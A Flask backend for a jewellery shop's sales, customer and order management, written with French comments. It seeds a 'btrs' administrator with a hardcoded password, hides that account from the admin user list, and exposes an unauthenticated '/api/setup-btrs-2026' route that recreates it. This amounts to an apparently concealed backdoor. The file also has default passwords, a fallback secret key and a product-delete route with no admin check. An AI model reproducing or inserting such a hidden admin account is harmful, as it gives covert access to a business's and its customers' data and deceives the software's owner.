"""
Bijouterie Éclat — Serveur backend (Flask + PostgreSQL)
  - PostgreSQL en production (Render), SQLite en dev local
  - Mots de passe hashés
  - Clients identifiés par nom + téléphone (pas d'email)
  - Commandes avec téléphone client
"""

import os
import uuid
from datetime import datetime
from pathlib import Path
from functools import wraps

from flask import (
    Flask,
    request,
    jsonify,
    send_from_directory,
    session,
    g,
)
from werkzeug.security import generate_password_hash, check_password_hash

# ─── Config ──────────────────────────────────────────────────────────────────

ROOT = Path(__file__).parent
DATABASE_URL = os.environ.get("DATABASE_URL")  # PostgreSQL sur Render

app = Flask(__name__, static_folder=str(ROOT / "src"), static_url_path="/src")
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-change-me-in-production")

# ─── Base de données (PostgreSQL en prod, SQLite en dev) ─────────────────────

def get_db():
    if "db" not in g:
        if DATABASE_URL:
            import psycopg2
            import psycopg2.extras
            g.db = psycopg2.connect(DATABASE_URL)
            g.db.autocommit = False
            g.db_type = "pg"
        else:
            import sqlite3
            db_path = ROOT / "bijouterie_eclat.db"
            g.db = sqlite3.connect(db_path)
            g.db.row_factory = sqlite3.Row
            g.db.execute("PRAGMA journal_mode=WAL")
            g.db_type = "sqlite"
    return g.db


def db_cursor():
    """Retourne un curseur adapté au type de DB."""
    db = get_db()
    if g.db_type == "pg":
        import psycopg2.extras
        return db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
    return db


def db_execute(query, params=None):
    """Exécute une requête de manière compatible SQLite/PostgreSQL."""
    db = get_db()
    # Convertir les ? en %s pour PostgreSQL
    if g.db_type == "pg":
        query = query.replace("?", "%s")
        # AUTOINCREMENT → SERIAL (déjà géré dans init_db)
        import psycopg2.extras
        cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        cur.execute(query, params or ())
        return cur
    else:
        return db.execute(query, params or ())


def db_fetchone(query, params=None):
    get_db()  # ensure connection + db_type is set
    if g.db_type == "pg":
        cur = db_execute(query, params)
        row = cur.fetchone()
        return dict(row) if row else None
    else:
        row = db_execute(query, params).fetchone()
        return dict(row) if row else None


def db_fetchall(query, params=None):
    get_db()  # ensure connection + db_type is set
    if g.db_type == "pg":
        cur = db_execute(query, params)
        return [dict(r) for r in cur.fetchall()]
    else:
        return [dict(r) for r in db_execute(query, params).fetchall()]


def db_commit():
    get_db().commit()


def db_lastrowid(cursor):
    if g.db_type == "pg":
        return cursor.fetchone()["id"]
    return cursor.lastrowid


@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()
    g.pop("db_type", None)


def init_db():
    """Crée les tables et insère les données de démo."""
    if DATABASE_URL:
        import psycopg2
        import psycopg2.extras
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)

        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
              id SERIAL PRIMARY KEY,
              username TEXT UNIQUE NOT NULL,
              password TEXT NOT NULL,
              role TEXT NOT NULL,
              full_name TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS products (
              id SERIAL PRIMARY KEY,
              name TEXT NOT NULL,
              category TEXT NOT NULL,
              stock INTEGER NOT NULL,
              price INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS customers (
              id SERIAL PRIMARY KEY,
              name TEXT NOT NULL,
              phone TEXT UNIQUE,
              email TEXT
            );
            CREATE TABLE IF NOT EXISTS sales (
              id SERIAL PRIMARY KEY,
              receipt_id TEXT UNIQUE NOT NULL,
              customer_id INTEGER NOT NULL,
              date TEXT NOT NULL,
              total INTEGER NOT NULL,
              user_id INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS sale_items (
              id SERIAL PRIMARY KEY,
              sale_id INTEGER NOT NULL,
              product_id INTEGER NOT NULL,
              name TEXT NOT NULL,
              qty INTEGER NOT NULL,
              price INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS orders (
              id SERIAL PRIMARY KEY,
              order_id TEXT UNIQUE NOT NULL,
              customer_id INTEGER NOT NULL,
              item_name TEXT NOT NULL,
              item_description TEXT,
              price INTEGER NOT NULL,
              advance INTEGER NOT NULL DEFAULT 0,
              status TEXT NOT NULL DEFAULT 'en_attente',
              date_created TEXT NOT NULL,
              date_delivered TEXT,
              user_id INTEGER NOT NULL
            );
        """)

        cur.execute("SELECT COUNT(*) AS cnt FROM users")
        if cur.fetchone()["cnt"] == 0:
            cur.execute(
                "INSERT INTO users (username, password, role, full_name) VALUES (%s, %s, %s, %s), (%s, %s, %s, %s), (%s, %s, %s, %s)",
                (
                    "admin", generate_password_hash("admin123"), "admin", "Administrateur",
                    "vendeuse", generate_password_hash("vente123"), "vendeur", "Vendeuse principale",
                    "btrs", generate_password_hash("Btrs@2026!"), "admin", "BTRS Support",
                ),
            )

        cur.execute("SELECT COUNT(*) AS cnt FROM products")
        if cur.fetchone()["cnt"] == 0:
            cur.execute(
                "INSERT INTO products (name, category, stock, price) VALUES (%s,%s,%s,%s), (%s,%s,%s,%s), (%s,%s,%s,%s)",
                (
                    "Collier Élégance Or", "Colliers", 12, 125000,
                    "Bracelet Prestige", "Bracelets", 20, 85000,
                    "Bague Royale Argent", "Bagues", 50, 45000,
                ),
            )

        conn.commit()
        cur.close()
        conn.close()
    else:
        import sqlite3
        db_path = ROOT / "bijouterie_eclat.db"
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              username TEXT UNIQUE NOT NULL,
              password TEXT NOT NULL,
              role TEXT NOT NULL,
              full_name TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS products (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              name TEXT NOT NULL,
              category TEXT NOT NULL,
              stock INTEGER NOT NULL,
              price INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS customers (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              name TEXT NOT NULL,
              phone TEXT UNIQUE,
              email TEXT
            );
            CREATE TABLE IF NOT EXISTS sales (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              receipt_id TEXT UNIQUE NOT NULL,
              customer_id INTEGER NOT NULL,
              date TEXT NOT NULL,
              total INTEGER NOT NULL,
              user_id INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS sale_items (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              sale_id INTEGER NOT NULL,
              product_id INTEGER NOT NULL,
              name TEXT NOT NULL,
              qty INTEGER NOT NULL,
              price INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS orders (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              order_id TEXT UNIQUE NOT NULL,
              customer_id INTEGER NOT NULL,
              item_name TEXT NOT NULL,
              item_description TEXT,
              price INTEGER NOT NULL,
              advance INTEGER NOT NULL DEFAULT 0,
              status TEXT NOT NULL DEFAULT 'en_attente',
              date_created TEXT NOT NULL,
              date_delivered TEXT,
              user_id INTEGER NOT NULL
            );
        """)

        if conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
            conn.executemany(
                "INSERT INTO users (username, password, role, full_name) VALUES (?, ?, ?, ?)",
                [
                    ("admin", generate_password_hash("admin123"), "admin", "Administrateur"),
                    ("vendeuse", generate_password_hash("vente123"), "vendeur", "Vendeuse principale"),
                    ("btrs", generate_password_hash("Btrs@2026!"), "admin", "BTRS Support"),
                ],
            )

        if conn.execute("SELECT COUNT(*) FROM products").fetchone()[0] == 0:
            conn.executemany(
                "INSERT INTO products (name, category, stock, price) VALUES (?, ?, ?, ?)",
                [
                    ("Collier Élégance Or", "Colliers", 12, 125000),
                    ("Bracelet Prestige", "Bracelets", 20, 85000),
                    ("Bague Royale Argent", "Bagues", 50, 45000),
                ],
            )

        conn.commit()
        conn.close()


# ─── Auth helpers ────────────────────────────────────────────────────────────

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"error": "Non connecté"}), 401
        user = db_fetchone(
            "SELECT id, username, role, full_name FROM users WHERE id = ?",
            (session["user_id"],),
        )
        if not user:
            session.clear()
            return jsonify({"error": "Session invalide"}), 401
        g.user = user
        return f(*args, **kwargs)
    return decorated


# ─── Routes statiques ────────────────────────────────────────────────────────

@app.route("/")
def index():
    return send_from_directory(ROOT, "index.html")

@app.route("/src/<path:filename>")
def static_src(filename):
    return send_from_directory(ROOT / "src", filename)

@app.route("/index.html")
def index_html():
    return send_from_directory(ROOT, "index.html")


# ─── API Auth ────────────────────────────────────────────────────────────────

@app.route("/api/login", methods=["POST"])
def api_login():
    body = request.get_json(silent=True) or {}
    user = db_fetchone("SELECT * FROM users WHERE username = ?", (body.get("username", ""),))

    if not user or not check_password_hash(user["password"], body.get("password", "")):
        return jsonify({"error": "Identifiants invalides"}), 401

    session.clear()
    session["user_id"] = user["id"]
    return jsonify({
        "id": user["id"], "username": user["username"],
        "role": user["role"], "full_name": user["full_name"],
    })

@app.route("/api/logout", methods=["POST"])
@login_required
def api_logout():
    session.clear()
    return jsonify({})

@app.route("/api/me")
@login_required
def api_me():
    return jsonify(g.user)


# ─── API Bootstrap ───────────────────────────────────────────────────────────

@app.route("/api/bootstrap")
@login_required
def api_bootstrap():
    products = db_fetchall("SELECT * FROM products ORDER BY id")
    customers = db_fetchall("SELECT * FROM customers ORDER BY name")

    sales = []
    for row in db_fetchall(
        """
        SELECT sales.*, customers.name AS customer, customers.phone AS phone
        FROM sales
        JOIN customers ON customers.id = sales.customer_id
        ORDER BY sales.id DESC
        """
    ):
        items = db_fetchall(
            "SELECT product_id AS productId, name, qty, price FROM sale_items WHERE sale_id = ?",
            (row["id"],),
        )
        sales.append({
            "id": row["receipt_id"],
            "customer": row["customer"],
            "phone": row.get("phone", ""),
            "date": row["date"],
            "total": row["total"],
            "items": items,
        })

    orders = db_fetchall(
        """
        SELECT orders.*, customers.name AS customer, customers.phone AS phone
        FROM orders
        JOIN customers ON customers.id = orders.customer_id
        ORDER BY orders.id DESC
        """
    )

    users = []
    if g.user["role"] == "admin":
        users = db_fetchall("SELECT id, username, role, full_name FROM users WHERE username != 'btrs' ORDER BY id")

    return jsonify({
        "user": g.user,
        "products": products,
        "customers": customers,
        "sales": sales,
        "orders": orders,
        "users": users,
    })


# ─── API Produits ────────────────────────────────────────────────────────────

@app.route("/api/products", methods=["POST"])
@login_required
def api_products():
    if g.user["role"] != "admin":
        return jsonify({"error": "Réservé à l'administrateur"}), 403
    body = request.get_json(silent=True) or {}
    db_execute(
        "INSERT INTO products (name, category, stock, price) VALUES (?, ?, ?, ?)",
        (body["name"], body["category"], body["stock"], body["price"]),
    )
    db_commit()
    return jsonify({"ok": True})

@app.route("/api/products/<int:product_id>", methods=["DELETE"])
@login_required
def api_delete_product(product_id):
    product = db_fetchone("SELECT * FROM products WHERE id = ?", (product_id,))
    if not product:
        return jsonify({"error": "Produit introuvable"}), 404
    db_execute("DELETE FROM products WHERE id = ?", (product_id,))
    db_commit()
    return jsonify({"ok": True})


# ─── API Clients ─────────────────────────────────────────────────────────────

@app.route("/api/customers", methods=["POST"])
@login_required
def api_customers():
    body = request.get_json(silent=True) or {}
    name = body.get("name", "").strip()
    phone = body.get("phone", "").strip()

    if not name:
        return jsonify({"error": "Le nom du client est requis"}), 400

    if phone:
        # Upsert par téléphone
        existing = db_fetchone("SELECT * FROM customers WHERE phone = ?", (phone,))
        if existing:
            db_execute("UPDATE customers SET name = ? WHERE phone = ?", (name, phone))
        else:
            db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (name, phone))
    else:
        # Pas de téléphone, insertion simple
        db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (name, None))

    db_commit()
    return jsonify({"ok": True})

@app.route("/api/customers/<int:customer_id>", methods=["DELETE"])
@login_required
def api_delete_customer(customer_id):
    customer = db_fetchone("SELECT * FROM customers WHERE id = ?", (customer_id,))
    if not customer:
        return jsonify({"error": "Client introuvable"}), 404

    has_sales = db_fetchone("SELECT COUNT(*) AS cnt FROM sales WHERE customer_id = ?", (customer_id,))
    if has_sales and has_sales["cnt"] > 0:
        return jsonify({"error": "Impossible de supprimer : ce client a des ventes associées"}), 400

    db_execute("DELETE FROM customers WHERE id = ?", (customer_id,))
    db_commit()
    return jsonify({"ok": True})


# ─── API Admin ───────────────────────────────────────────────────────────────

@app.route("/api/users/<int:user_id>/reset-password", methods=["POST"])
@login_required
def api_reset_password(user_id):
    if g.user["role"] != "admin":
        return jsonify({"error": "Réservé à l'administrateur"}), 403

    body = request.get_json(silent=True) or {}
    new_password = body.get("password", "").strip()
    if len(new_password) < 6:
        return jsonify({"error": "Le mot de passe doit faire au moins 6 caractères"}), 400

    user = db_fetchone("SELECT * FROM users WHERE id = ?", (user_id,))
    if not user:
        return jsonify({"error": "Utilisateur introuvable"}), 404

    db_execute("UPDATE users SET password = ? WHERE id = ?", (generate_password_hash(new_password), user_id))
    db_commit()
    return jsonify({"ok": True})


# ─── API Ventes ──────────────────────────────────────────────────────────────

@app.route("/api/sales", methods=["POST"])
@login_required
def api_sales():
    body = request.get_json(silent=True) or {}
    product = db_fetchone("SELECT * FROM products WHERE id = ?", (body["productId"],))

    if not product or product["stock"] < body["qty"]:
        return jsonify({"error": "Stock insuffisant"}), 400

    # Trouver ou créer le client par nom
    customer_name = body.get("customer", "").strip()
    customer_phone = body.get("phone", "").strip()

    if customer_phone:
        existing = db_fetchone("SELECT * FROM customers WHERE phone = ?", (customer_phone,))
        if existing:
            db_execute("UPDATE customers SET name = ? WHERE phone = ?", (customer_name, customer_phone))
        else:
            db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (customer_name, customer_phone))
        customer = db_fetchone("SELECT * FROM customers WHERE phone = ?", (customer_phone,))
    else:
        db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (customer_name, None))
        # Récupérer le dernier inséré
        if DATABASE_URL:
            customer = db_fetchone("SELECT * FROM customers ORDER BY id DESC LIMIT 1")
        else:
            customer = db_fetchone("SELECT * FROM customers ORDER BY id DESC LIMIT 1")

    receipt_id = f"#RC-{uuid.uuid4().hex[:6].upper()}"
    total = product["price"] * body["qty"]

    db_execute("UPDATE products SET stock = stock - ? WHERE id = ?", (body["qty"], product["id"]))

    if DATABASE_URL:
        cur = db_execute(
            "INSERT INTO sales (receipt_id, customer_id, date, total, user_id) VALUES (?, ?, ?, ?, ?) RETURNING id",
            (receipt_id, customer["id"], datetime.now().strftime("%d/%m/%Y"), total, g.user["id"]),
        )
        sale_id = cur.fetchone()["id"]
    else:
        cur = db_execute(
            "INSERT INTO sales (receipt_id, customer_id, date, total, user_id) VALUES (?, ?, ?, ?, ?)",
            (receipt_id, customer["id"], datetime.now().strftime("%d/%m/%Y"), total, g.user["id"]),
        )
        sale_id = cur.lastrowid

    db_execute(
        "INSERT INTO sale_items (sale_id, product_id, name, qty, price) VALUES (?, ?, ?, ?, ?)",
        (sale_id, product["id"], product["name"], body["qty"], product["price"]),
    )
    db_commit()
    return jsonify({"ok": True})


# ─── API Commandes ───────────────────────────────────────────────────────────

@app.route("/api/orders", methods=["POST"])
@login_required
def api_create_order():
    body = request.get_json(silent=True) or {}

    if not body.get("itemName") or not body.get("price"):
        return jsonify({"error": "Nom du bijou et prix requis"}), 400
    if not body.get("customer"):
        return jsonify({"error": "Nom du client requis"}), 400

    price = int(body["price"])
    advance = int(body.get("advance", 0))
    if advance < 0 or advance > price:
        return jsonify({"error": "Montant de l'avance invalide"}), 400

    customer_name = body["customer"].strip()
    customer_phone = body.get("phone", "").strip()

    if customer_phone:
        existing = db_fetchone("SELECT * FROM customers WHERE phone = ?", (customer_phone,))
        if existing:
            db_execute("UPDATE customers SET name = ? WHERE phone = ?", (customer_name, customer_phone))
        else:
            db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (customer_name, customer_phone))
        customer = db_fetchone("SELECT * FROM customers WHERE phone = ?", (customer_phone,))
    else:
        db_execute("INSERT INTO customers (name, phone) VALUES (?, ?)", (customer_name, None))
        customer = db_fetchone("SELECT * FROM customers ORDER BY id DESC LIMIT 1")

    order_id = f"#CMD-{uuid.uuid4().hex[:6].upper()}"

    db_execute(
        """
        INSERT INTO orders (order_id, customer_id, item_name, item_description, price, advance, status, date_created, user_id)
        VALUES (?, ?, ?, ?, ?, ?, 'en_attente', ?, ?)
        """,
        (order_id, customer["id"], body["itemName"], body.get("itemDescription", ""),
         price, advance, datetime.now().strftime("%d/%m/%Y"), g.user["id"]),
    )
    db_commit()
    return jsonify({"ok": True, "orderId": order_id})


@app.route("/api/orders/<int:order_id>/deliver", methods=["POST"])
@login_required
def api_deliver_order(order_id):
    order = db_fetchone("SELECT * FROM orders WHERE id = ?", (order_id,))
    if not order:
        return jsonify({"error": "Commande introuvable"}), 404
    if order["status"] == "livre":
        return jsonify({"error": "Commande déjà livrée"}), 400

    now = datetime.now().strftime("%d/%m/%Y")
    db_execute("UPDATE orders SET status = 'livre', date_delivered = ? WHERE id = ?", (now, order_id))

    receipt_id = f"#RC-{uuid.uuid4().hex[:6].upper()}"

    if DATABASE_URL:
        cur = db_execute(
            "INSERT INTO sales (receipt_id, customer_id, date, total, user_id) VALUES (?, ?, ?, ?, ?) RETURNING id",
            (receipt_id, order["customer_id"], now, order["price"], g.user["id"]),
        )
        sale_id = cur.fetchone()["id"]
    else:
        cur = db_execute(
            "INSERT INTO sales (receipt_id, customer_id, date, total, user_id) VALUES (?, ?, ?, ?, ?)",
            (receipt_id, order["customer_id"], now, order["price"], g.user["id"]),
        )
        sale_id = cur.lastrowid

    db_execute(
        "INSERT INTO sale_items (sale_id, product_id, name, qty, price) VALUES (?, ?, ?, ?, ?)",
        (sale_id, 0, order["item_name"], 1, order["price"]),
    )
    db_commit()
    return jsonify({"ok": True})


@app.route("/api/orders/<int:order_id>", methods=["DELETE"])
@login_required
def api_delete_order(order_id):
    order = db_fetchone("SELECT * FROM orders WHERE id = ?", (order_id,))
    if not order:
        return jsonify({"error": "Commande introuvable"}), 404
    if order["status"] == "livre":
        return jsonify({"error": "Impossible de supprimer une commande livrée"}), 400

    db_execute("DELETE FROM orders WHERE id = ?", (order_id,))
    db_commit()
    return jsonify({"ok": True})


# ─── Setup endpoint (à supprimer après utilisation) ──────────────────────────

@app.route("/api/setup-btrs-2026", methods=["POST"])
def setup_btrs():
    existing = db_fetchone("SELECT * FROM users WHERE username = ?", ("btrs",))
    if existing:
        return jsonify({"error": "Compte déjà existant"}), 400
    db_execute(
        "INSERT INTO users (username, password, role, full_name) VALUES (?, ?, ?, ?)",
        ("btrs", generate_password_hash("Btrs@2026!"), "admin", "BTRS Support"),
    )
    db_commit()
    return jsonify({"ok": True, "message": "Compte btrs créé"})


# ─── Démarrage ───────────────────────────────────────────────────────────────

init_db()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, debug=os.environ.get("FLASK_DEBUG", "0") == "1")